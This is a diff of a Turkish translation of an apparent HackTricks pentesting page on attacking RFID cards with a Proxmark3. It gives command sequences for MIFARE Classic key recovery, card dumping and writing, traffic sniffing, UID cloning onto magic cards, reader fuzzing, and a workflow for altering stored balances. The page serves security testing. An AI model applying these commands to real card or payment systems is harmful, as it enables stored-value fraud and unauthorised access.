@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Proxmark3 ile RFID Sistemlerine Saldırmak
+## Proxmark3 ile RFID Sistemlerine Saldırma
 
-The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
+Yapmanız gereken ilk şey bir [**Proxmark3**](https://proxmark.com) edinmek ve [**yazılımı ve bağımlılık**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**larını yüklemektir**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
 
-### MIFARE Classic 1KB'ye Saldırmak
+### MIFARE Classic 1KB'ye Saldırma
 
-Bunun **16 sektörü** vardır, her biri **4 bloka** sahip ve her blok **16B** içerir. UID, sektör 0 blok 0'da bulunur (ve değiştirilemez).\
-Her sektöre erişmek için **2 anahtara** (**A** ve **B**) ihtiyacınız vardır; bunlar **her sektörün blok 3'ünde** saklanır (sector trailer). Sector trailer ayrıca iki anahtarı kullanarak **her blok** için **okuma ve yazma** izinlerini veren **erişim bitlerini** de saklar.\
-İki anahtar, örneğin ilkini biliyorsanız okuma, ikincisini biliyorsanız yazma izni vermek için faydalıdır.
+**16 sektöre** sahiptir; bunların her biri **4 bloktan** oluşur ve her blok **16B** içerir. UID, sektör 0 blok 0'da bulunur (ve değiştirilemez).\
+Her sektöre erişmek için, her sektörün **3. bloğunda** (sektör trailer'ı) depolanan **2 anahtara** (**A** ve **B**) ihtiyaç duyarsınız. Sektör trailer'ı ayrıca, 2 anahtarı kullanarak **her blok için okuma ve yazma** izinlerini belirleyen **access bits** değerlerini de depolar.\
+Örneğin, ilkini biliyorsanız okuma, ikincisini biliyorsanız yazma izinleri vermek için 2 anahtar kullanışlıdır.
 
-Çeşitli saldırılar gerçekleştirilebilir
+Birkaç saldırı gerçekleştirilebilir<sup>[[1]](#references)</sup>.
 ```bash
 proxmark3> hf mf #List attacks
 
@@ -31,11 +31,11 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **kullanılan kriptografik işlemler zayıftır** and knowing the plain and cipher text you can calculate it (`mfkey64` aracı).
+Proxmark3, hassas verileri bulmaya çalışmak için **Tag to Reader communication** üzerinde **eavesdropping** gibi başka işlemler gerçekleştirmeye olanak tanır. Bu kartta, kullanılan **cryptographic operations weak** olduğu ve plain ile cipher text'i bilerek kullanılan anahtarı (`mfkey64` tool'u) hesaplayabildiğiniz için iletişimi dinleyip kullanılan anahtarı hesaplayabilirsiniz.<sup>[[3]](#references)</sup>
 
-#### MiFare Classic için saklanan bakiye kötüye kullanımı hızlı iş akışı
+#### MiFare Classic'te stored-value abuse için hızlı iş akışı
 
-Terminaller Classic kartlarda bakiyeleri sakladığında, tipik uçtan uca akış şudur:
+Terminaller bakiyeleri Classic kartlarda depoladığında, tipik uçtan uca akış şöyledir:<sup>[[4]](#references)</sup>
 ```bash
 # 1) Recover sector keys and dump full card
 proxmark3> hf mf autopwn
@@ -51,19 +51,19 @@ proxmark3> hf mf csetuid -u <original_uid>
 ```
 Notlar
 
-- `hf mf autopwn` nested/darkside/HardNested-style saldırıları organize eder, anahtarları kurtarır ve client dumps folder içinde dumplar oluşturur.
-- block 0/UID yazma işlemi yalnızca magic gen1a/gen2 kartlarda çalışır. Normal Classic kartların UID'si salt okunurdur.
-- Birçok dağıtım Classic "value blocks" veya basit checksums kullanır. Düzenleme yaptıktan sonra tüm tekrarlanan/tamamlanan alanların ve checksums'ın tutarlı olduğundan emin olun.
+- `hf mf autopwn`, nested/darkside/HardNested-style attacks'leri yönetir, anahtarları kurtarır ve client dumps klasöründe dump'lar oluşturur.
+- Block 0/UID yazma işlemi yalnızca magic gen1a/gen2 cards üzerinde çalışır. Normal Classic cards salt okunur UID'ye sahiptir.<sup>[[2]](#references)</sup>
+- Birçok deployment, Classic "value blocks" veya basit checksum'lar kullanır. Düzenleme sonrasında tüm yinelenen/tamamlayıcı alanların ve checksum'ların tutarlı olduğundan emin olun.
 
-See a higher-level methodology and mitigations in:
+Daha üst düzey bir methodology ve mitigations için bkz.:
 
 {{#ref}}
 pentesting-rfid.md
 {{#endref}}
 
-### Ham Komutlar
+### Raw Komutlar
 
-IoT sistemleri bazen **markasız veya ticari olmayan etiketler** kullanır. Bu durumda, Proxmark3'ü kullanarak etiketlere özel **ham komutlar gönderebilirsiniz**.
+IoT systems bazen **nonbranded veya noncommercial tags** kullanır. Bu durumda Proxmark3'ü kullanarak **tags'e özel raw komutlar** gönderebilirsiniz.
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
@@ -73,21 +73,21 @@ No chinese magic backdoor command detected
 Prng detection: WEAK
 Valid ISO14443A Tag Found - Quiting Search
 ```
-Bu bilgilerle kart ve onunla iletişim kurma yöntemi hakkında bilgi aramayı deneyebilirsiniz. Proxmark3 aşağıdaki gibi raw komutlar göndermenizi sağlar: `hf 14a raw -p -b 7 26`
+Bu bilgilerle kart ve onunla nasıl iletişim kurulacağı hakkında bilgi aramayı deneyebilirsiniz. Proxmark3 şu tür raw komutları göndermenize olanak tanır: `hf 14a raw -p -b 7 26`
 
 ### Scripts
 
-Proxmark3 yazılımı, basit görevleri gerçekleştirmek için kullanabileceğiniz önceden yüklenmiş bir **automation scripts** listesi ile gelir. Tam listeyi almak için `script list` komutunu kullanın. Ardından `script run` komutunu, script'in adını takip edecek şekilde kullanın:
+Proxmark3 yazılımı, basit görevleri gerçekleştirmek için kullanabileceğiniz önceden yüklenmiş bir **automation scripts** listesiyle birlikte gelir. Listenin tamamını almak için `script list` komutunu kullanın. Ardından `script run` komutunu ve script’in adını kullanın:
 ```
 proxmark3> script run mfkeys
 ```
-**fuzz tag readers** yapmak için bir script oluşturabilirsiniz; bir **valid card**'ın verilerini kopyalayarak, bir veya daha fazla rastgele **bytes**'ı **randomize** eden bir **Lua script** yazın ve herhangi bir iterasyonda **reader crashes** olup olmadığını kontrol edin.
+**valid card** verilerini kopyaladıktan sonra, bir veya daha fazla rastgele **byte**'ı **randomize** eden bir **Lua script** yazarak ve her iterasyonda **reader**'ın çöküp çökmediğini kontrol ederek **tag reader**'larını **fuzz** etmek için bir script oluşturabilirsiniz.
 
 ## Referanslar
 
-- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
-- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
-- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
-- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
+- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
+- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
+- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
+- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
 
 {{#include ../../banners/hacktricks-training.md}}
